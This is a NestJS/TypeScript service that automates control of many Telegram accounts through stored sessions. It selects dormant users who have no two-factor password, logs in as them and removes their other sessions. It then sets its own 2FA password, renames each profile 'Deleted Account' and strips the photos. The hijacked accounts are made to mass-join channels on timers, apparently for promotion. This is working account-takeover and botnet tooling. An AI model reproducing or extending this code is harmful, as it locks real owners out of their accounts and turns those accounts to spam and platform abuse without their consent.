import { ChannelsService } from '../channels/channels.service';
import { Channel } from '../channels/schemas/channel.schema';
import { BadRequestException, ConflictException, HttpException, Inject, Injectable, InternalServerErrorException, Logger, NotFoundException, forwardRef } from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model } from 'mongoose';
import { CreatePromoteClientDto } from './dto/create-promote-client.dto';
import { PromoteClient, PromoteClientDocument } from './schemas/promote-client.schema';
import { TelegramService } from '../Telegram/Telegram.service';
import { sleep } from 'telegram/Helpers';
import { UsersService } from '../users/users.service';
import { ActiveChannelsService } from '../active-channels/active-channels.service';
import { ClientService } from '../clients/client.service';
import { UpdatePromoteClientDto } from './dto/update-promote-client.dto';
import { BufferClientService } from '../buffer-clients/buffer-client.service';
import { parseError } from '../../utils/parseError';
import { fetchWithTimeout } from '../../utils/fetchWithTimeout';
import { notifbot } from '../../utils/logbots';
@Injectable()
export class PromoteClientService {
    private readonly logger = new Logger(PromoteClientService.name);
    private joinChannelMap: Map<string, Channel[]> = new Map();
    private joinChannelIntervalId: NodeJS.Timeout;
    private leaveChannelMap: Map<string, string[]> = new Map();
    private leaveChannelIntervalId: NodeJS.Timeout;
    private isLeaveChannelProcessing: boolean = false;
    private isJoinChannelProcessing: boolean = false;
    private readonly JOIN_CHANNEL_INTERVAL = 4 * 60 * 1000; // 4 minutes
    constructor(@InjectModel('promoteClientModule') private promoteClientModel: Model<PromoteClientDocument>,
        @Inject(forwardRef(() => TelegramService))
        private telegramService: TelegramService,
        @Inject(forwardRef(() => UsersService))
        private usersService: UsersService,
        @Inject(forwardRef(() => ActiveChannelsService))
        private activeChannelsService: ActiveChannelsService,
        @Inject(forwardRef(() => ClientService))
        private clientService: ClientService,
        @Inject(forwardRef(() => ActiveChannelsService))
        private channelsService: ChannelsService,
        @Inject(forwardRef(() => BufferClientService))
        private bufferClientService: BufferClientService,
    ) {}

    async create(promoteClient: CreatePromoteClientDto): Promise<PromoteClient> {
        const newUser = new this.promoteClientModel(promoteClient);
        return newUser.save();
    }

    async findAll(): Promise<PromoteClient[]> {
        return this.promoteClientModel.find().exec();
    }

    async findOne(mobile: string, throwErr: boolean = true): Promise<PromoteClient> {
        const user = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();
        if (!user && throwErr) {
            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);
        }
        return user;
    }


    async update(mobile: string, updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {
        const updatedUser = await this.promoteClientModel.findOneAndUpdate(
            { mobile },
            { $set: updateClientDto },
            { new: true, upsert: true, returnDocument: 'after' }
        ).exec();

        if (!updatedUser) {
            throw new NotFoundException(`User with mobile ${mobile} not found`);
        }

        return updatedUser;
    }

    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreatePromoteClientDto | UpdatePromoteClientDto): Promise<PromoteClient> {
        const existingUser = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();
        if (existingUser) {
            console.log("Updating")
            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdatePromoteClientDto);
        } else {
            console.log("creating")
            return this.create(createOrUpdateUserDto as CreatePromoteClientDto);
        }
    }

    async remove(mobile: string): Promise<void> {
        await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Deleting Promote Client : ${mobile}`)}`);
        const result = await this.promoteClientModel.deleteOne({ mobile }).exec();
        if (result.deletedCount === 0) {
            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);
        }
    }
    async search(filter: any): Promise<PromoteClient[]> {
        console.log(filter)
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }
        }
        console.log(filter)
        return this.promoteClientModel.find(filter).exec();
    }

    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<PromoteClient[]> {
        try {

            if (!query) {
                throw new BadRequestException('Query is invalid.');
            }
            const queryExec = this.promoteClientModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }

            if (limit) {
                queryExec.limit(limit);
            }

            if (skip) {
                queryExec.skip(skip);
            }

            return await queryExec.exec();
        } catch (error) {
            throw new InternalServerErrorException(error.message);
        }
    }

    removeFromPromoteMap(key: string) {
        this.joinChannelMap.delete(key)
    }
    clearPromoteMap() {
        console.log("PromoteMap cleared")
        this.joinChannelMap.clear()
    }

    async joinchannelForPromoteClients(skipExisting: boolean = true): Promise<string> {
        if (!this.telegramService.getActiveClientSetup()) {
            this.logger.log('Starting join channel process');
            this.clearJoinChannelInterval();
            try {
                const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys());
                this.logger.debug(`Using existing keys: ${existingkeys.join(', ')}`);
                
                await this.telegramService.disconnectAll();
                await sleep(2000);
                
                const clients = await this.promoteClientModel.find({ 
                    channels: { "$lt": 250 }, 
                    mobile: { $nin: existingkeys } 
                }).sort({ channels: 1 }).limit(4);

                this.logger.debug(`Found ${clients.length} clients to process`);

                if (clients.length > 0) {
                    for (const document of clients) {
                        try {
                            this.logger.debug(`Processing client: ${document.mobile}`);
                            const client = await this.telegramService.createClient(document.mobile, false, false);
                            
                            const channels = await client.channelInfo(true);
                            this.logger.debug(`${document.mobile}: Found ${channels.ids.length} existing channels`);
                            
                            await this.update(document.mobile, { channels: channels.ids.length });
                            
                            if (channels.canSendFalseCount < 10) {
                                if (channels.ids.length < 220) {
                                    this.logger.debug(`${document.mobile}: Getting channels from channels service`);
                                    const result = await this.channelsService.getActiveChannels(150, 0, channels.ids);
                                    this.joinChannelMap.set(document.mobile, result);
                                    this.joinChannelQueue();
                                } else {
                                    this.logger.debug(`${document.mobile}: Getting channels from active channels service`);
                                    const result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);
                                    this.joinChannelMap.set(document.mobile, result);
                                    this.joinChannelQueue();
                                }
                            } else {
                                this.logger.debug(`${document.mobile}: Too many channels with no send permissions, queueing for leave: ${channels.canSendFalseChats.length}`);
                                this.leaveChannelMap.set(document.mobile, channels.canSendFalseChats);
                                this.leaveChannelQueue();
                            }
                        } catch (error) {
                            const errorDetails = parseError(error);
                            this.logger.error(`Error processing client ${document.mobile}:`, errorDetails);
                            
                            if (error.message === "SESSION_REVOKED" ||
                                error.message === "AUTH_KEY_UNREGISTERED" ||
                                error.message === "USER_DEACTIVATED" ||
                                error.message === "USER_DEACTIVATED_BAN") {
                                this.logger.warn(`${document.mobile}: Session invalid, removing client`);
                                await this.remove(document.mobile);
                            }
                        } finally {
                            await this.telegramService.deleteClient(document.mobile);
                        }
                    }
                }
                
                this.logger.log(`Join channel process triggered successfully for ${clients.length} clients`);
                return `Initiated Joining channels for ${clients.length}`;
            } catch (error) {
                this.logger.error('Error during joinchannelForPromoteClients:', error);
                throw new Error("Failed to initiate channel joining process");
            }
        } else {
            this.logger.warn('Ignored active check for promote channels as an active client setup exists');
            return "Active client setup exists, skipping promotion";
        }
    }

    async joinChannelQueue() {
        if (this.isJoinChannelProcessing || this.joinChannelIntervalId) {
            this.logger.debug('Join channel process is already running');
            return;
        }

        const existingKeys = Array.from(this.joinChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to join, skipping queue');
            return;
        }

        this.isJoinChannelProcessing = true;
        this.joinChannelIntervalId = setInterval(async () => {
            try {
                const keys = Array.from(this.joinChannelMap.keys());
                if (keys.length === 0) {
                    this.logger.log('Join channel map is empty, clearing interval');
                    this.clearJoinChannelInterval();
                    return;
                }

                this.logger.debug(`Processing join channel interval at ${new Date().toISOString()}`);
                for (const mobile of keys) {
                    const channels = this.joinChannelMap.get(mobile);
                    if (!channels || channels.length === 0) {
                        this.logger.debug(`No more channels to join for ${mobile}, removing from map`);
                        this.removeFromPromoteMap(mobile);
                        continue;
                    }

                    const channel = channels.shift();
                    this.logger.debug(`${mobile}: Pending channels to join: ${channels.length}`);
                    this.joinChannelMap.set(mobile, channels);

                    try {
                        await this.telegramService.createClient(mobile, false, false);
                        this.logger.debug(`${mobile}: Attempting to join channel: @${channel.username}`);
                        await this.telegramService.tryJoiningChannel(mobile, channel);
                    } catch (error) {
                        const errorDetails = parseError(error, `${mobile} @${channel.username} Outer Err ERR: `, false);
                        this.logger.error(`${mobile}: Error joining @${channel.username}:`, errorDetails);

                        if (errorDetails.error === 'FloodWaitError' || error.errorMessage === 'CHANNELS_TOO_MUCH') {
                            this.logger.warn(`${mobile}: FloodWaitError or too many channels, handling...`);
                            this.removeFromPromoteMap(mobile);
                            const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);
                            await this.update(mobile, { channels: channelsInfo.ids.length });
                        }

                        if (errorDetails.message === "SESSION_REVOKED" ||
                            errorDetails.message === "AUTH_KEY_UNREGISTERED" ||
                            errorDetails.message === "USER_DEACTIVATED" ||
                            errorDetails.message === "USER_DEACTIVATED_BAN") {
                            this.logger.warn(`${mobile}: Session invalid, removing client`);
                            await this.remove(mobile);
                        }
                    } finally {
                        await this.telegramService.deleteClient(mobile);
                    }
                }
            } catch (error) {
                this.logger.error('Error in join channel interval:', error);
            }
        }, this.JOIN_CHANNEL_INTERVAL);
    }

    clearJoinChannelInterval() {
        if (this.joinChannelIntervalId) {
            this.logger.debug('Clearing join channel interval');
            clearInterval(this.joinChannelIntervalId);
            this.joinChannelIntervalId = null;
            this.isJoinChannelProcessing = false;
            setTimeout(() => {
                this.logger.debug('Triggering join channel process after timeout');
                this.joinchannelForPromoteClients(false);
            }, 30000);
        }
    }

    removeFromLeaveMap(key: string) {        
        this.logger.debug(`Removing mobile ${key} from leave map`);
        this.leaveChannelMap.delete(key);
        if (this.leaveChannelMap.size === 0) {
            this.logger.log('Leave map is now empty');
            this.clearLeaveChannelInterval();
        }
    }

    clearLeaveMap() {
        this.logger.debug('Clearing entire leave map');
        this.leaveChannelMap.clear();
        this.clearLeaveChannelInterval();
    }

    async leaveChannelQueue() {
        if (this.isLeaveChannelProcessing || this.leaveChannelIntervalId) {
            this.logger.debug('Leave channel process is already running, skipping');
            return;
        }

        const existingKeys = Array.from(this.leaveChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to leave, skipping queue');
            return;
        }

        this.isLeaveChannelProcessing = true;
        this.leaveChannelIntervalId = setInterval(async () => {
            try {
                const keys = Array.from(this.leaveChannelMap.keys());
                if (keys.length === 0) {
                    this.logger.log('Leave channel map is empty, clearing interval');
                    this.clearLeaveChannelInterval();
                    return;
                }

                this.logger.debug(`Processing leave channel interval at ${new Date().toISOString()}`);
                for (const mobile of keys) {
                    this.logger.debug(`Processing leave channels for mobile: ${mobile}`);
                    const channels = this.leaveChannelMap.get(mobile);
                    if (!channels || channels.length === 0) {
                        this.logger.debug(`No channels to leave for mobile: ${mobile}`);
                        this.removeFromLeaveMap(mobile);
                        continue;
                    }

                    const channelsToProcess = channels.splice(0, 10);
                    this.logger.debug(`${mobile}: Processing ${channelsToProcess.length} channels, ${channels.length} remaining`);
                    this.leaveChannelMap.set(mobile, channels);

                    try {
                        const client = await this.telegramService.createClient(mobile, false, false);
                        this.logger.debug(`${mobile}: Attempting to leave ${channelsToProcess.length} channels`);

                        await client.leaveChannels(channelsToProcess).catch(error => {
                            this.logger.error(`Error leaving channels for mobile ${mobile}:`, error);
                        });

                        const remainingChannels = await client.channelInfo(true);
                        await this.update(mobile, { channels: remainingChannels.ids.length });
                        this.logger.debug(`${mobile}: Successfully updated channel count to ${remainingChannels.ids.length}`);

                    } catch (error) {
                        const errorDetails = parseError(error);
                        this.logger.error(`Error in leave channel process for ${mobile}:`, errorDetails);
                        if (
                            errorDetails.message === "SESSION_REVOKED" ||
                            errorDetails.message === "AUTH_KEY_UNREGISTERED" ||
                            errorDetails.message === "USER_DEACTIVATED" ||
                            errorDetails.message === "USER_DEACTIVATED_BAN"
                        ) {
                            this.logger.warn(`${mobile}: Session invalid, removing client`);
                            await this.remove(mobile);
                            this.removeFromLeaveMap(mobile);
                        }
                    } finally {
                        await this.telegramService.deleteClient(mobile);
                    }
                }
            } catch (error) {
                this.logger.error('Error in leave channel interval:', error);
            }
        }, 60000);
    }

    clearLeaveChannelInterval() {
        if (this.leaveChannelIntervalId) {
            clearInterval(this.leaveChannelIntervalId);
            this.leaveChannelIntervalId = null;
            console.log("Leave channel interval cleared.");
        }
        this.isLeaveChannelProcessing = false;
    }

    async setAsPromoteClient(
        mobile: string,
        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]
    ) {
        const user = (await this.usersService.search({ mobile, expired: false }))[0];
        if (!user) {
            throw new BadRequestException('user not found');
        }
        const isExist = await this.findOne(mobile, false)
        if (isExist) {
            throw new ConflictException('PromoteClient already exist');
        }
        const clients = await this.clientService.findAll();
        const clientMobiles = clients.map(client => client?.mobile);
        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);
        if (!clientMobiles.includes(mobile) && !clientPromoteMobiles.includes(mobile)) {
            const telegramClient = await this.telegramService.createClient(mobile, false)
            try {
                await telegramClient.set2fa();
                await sleep(15000)
                await telegramClient.updateUsername('');
                await sleep(3000)
                await telegramClient.updatePrivacyforDeletedAccount();
                await sleep(3000)
                await telegramClient.updateProfile("Deleted Account", "Deleted Account");
                await sleep(3000)
                await telegramClient.deleteProfilePhotos();
                const channels = await this.telegramService.getChannelInfo(mobile, true)
                const promoteClient = {
                    tgId: user.tgId,
                    lastActive: "default",
                    mobile: user.mobile,
                    availableDate,
                    channels: channels.ids.length,
                }
                await this.promoteClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: promoteClient }, { new: true, upsert: true }).exec();
            } catch (error) {
                const errorDetails = parseError(error)
                throw new HttpException(errorDetails.message, errorDetails.status)
            }
            await this.telegramService.deleteClient(mobile)
            return "Client set as promote successfully";
        } else {
            throw new BadRequestException("Number is a Active Client")
        }
    }

    async checkPromoteClients() {
        if (!this.telegramService.getActiveClientSetup()) {
            await this.telegramService.disconnectAll()
            await sleep(2000);
            const promoteclients = await this.findAll();
            let goodIds: string[] = [];
            const badIds: string[] = [];
            if (promoteclients.length < 80) {
                for (let i = 0; i < 80 - promoteclients.length && badIds.length < 4; i++) {
                    badIds.push(i.toString())
                }
            }
            const clients = await this.clientService.findAll();
            const bufferClients = await this.bufferClientService.findAll();
            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => { return (client.promoteMobile) })]
            const bufferClientIds = bufferClients.map(client => client.mobile);
            const today = (new Date(Date.now())).toISOString().split('T')[0];
            for (const document of promoteclients) {
                if (!clientIds.includes(document.mobile) && !bufferClientIds.includes(document.mobile)) {
                    try {
                        const cli = await this.telegramService.createClient(document.mobile, true, false);
                        const me = await cli.getMe();
                        if (me.username) {
                            await this.telegramService.updateUsername(document.mobile, '');
                            await sleep(2000);
                        }
                        if (me.firstName !== "Deleted Account") {
                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');
                            await sleep(2000);
                            // await this.telegramService.updatePrivacyforDeletedAccount(document.mobile);
                        }
                        await this.telegramService.deleteProfilePhotos(document.mobile);
                        const hasPassword = await cli.hasPassword();
                        if (!hasPassword && badIds.length < 4) {
                            console.log("Client does not have password");
                            badIds.push(document.mobile);
                            // await this.remove(document.mobile);
                        } else {
                            // const channelinfo = await this.telegramService.getChannelInfo(document.mobile, true);
                            // await this.promoteClientModel.findOneAndUpdate({ mobile: document.mobile }, { channels: channelinfo.ids.length })
                            console.log(document.mobile, " :  ALL Good");
                            goodIds.push(document.mobile)
                        }
                        await this.telegramService.removeOtherAuths(document.mobile);
                        await sleep(2000);
                        await this.telegramService.deleteClient(document.mobile)
                    } catch (error) {
                        parseError(error);
                        badIds.push(document.mobile);
                        this.remove(document.mobile);
                        await this.telegramService.deleteClient(document.mobile)
                    }
                } else {
                    console.log("Number is a Active Client");
                    goodIds.push(document.mobile)
                    this.remove(document.mobile)
                }
            }
            goodIds = [...goodIds, ...clientIds, ...bufferClientIds]
            console.log("GoodIds: ", goodIds.length, "BadIds : ", badIds.length);
            this.addNewUserstoPromoteClients(badIds, goodIds);
        } else {
            console.log("ignored active check promote channels as active client setup exists")
        }
    }

    async addNewUserstoPromoteClients(badIds: string[], goodIds: string[]) {
        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];
        const documents = await this.usersService.executeQuery({ "mobile": { $nin: goodIds }, twoFA: false, expired: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 250 } }, { tgId: 1 }, badIds.length + 3);
        console.log("New promote documents to be added: ", documents.length)
        while (badIds.length > 0 && documents.length > 0) {
            const document = documents.shift();
            try {
                try {
                    const client = await this.telegramService.createClient(document.mobile, false);
                    const hasPassword = await client.hasPassword();
                    console.log("hasPassword: ", hasPassword);
                    if (!hasPassword) {
                        await client.removeOtherAuths();
                        await client.set2fa();
                        console.log("waiting for setting 2FA");
                        await sleep(30000);
                        await client.updateUsername('');
                        await sleep(3000)
                        await client.updatePrivacyforDeletedAccount();
                        await sleep(3000)
                        await client.updateProfile("Deleted Account", "Deleted Account");
                        await sleep(3000)
                        await client.deleteProfilePhotos();
                        const channels = await client.channelInfo(true)
                        console.log("Inserting Document");
                        const promoteClient = {
                            tgId: document.tgId,
                            lastActive: "today",
                            mobile: document.mobile,
                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],
                            channels: channels.ids.length,
                        }
                        await this.create(promoteClient);
                        await this.usersService.update(document.tgId, { twoFA: true })
                        console.log("=============Created PromoteClient=============")
                        await this.telegramService.deleteClient(document.mobile)
                        badIds.pop();
                    } else {
                        console.log("Failed to Update as PromoteClient has Password");
                        await this.usersService.update(document.tgId, { twoFA: true })
                        await this.telegramService.deleteClient(document.mobile)
                    }
                } catch (error) {
                    parseError(error)
                    await this.telegramService.deleteClient(document.mobile)
                }
            } catch (error) {
                parseError(error)
                console.error("An error occurred:", error);
            }
            await this.telegramService.deleteClient(document.mobile)
        }
        setTimeout(() => {
            this.joinchannelForPromoteClients()
        }, 2 * 60 * 1000);
    }
}
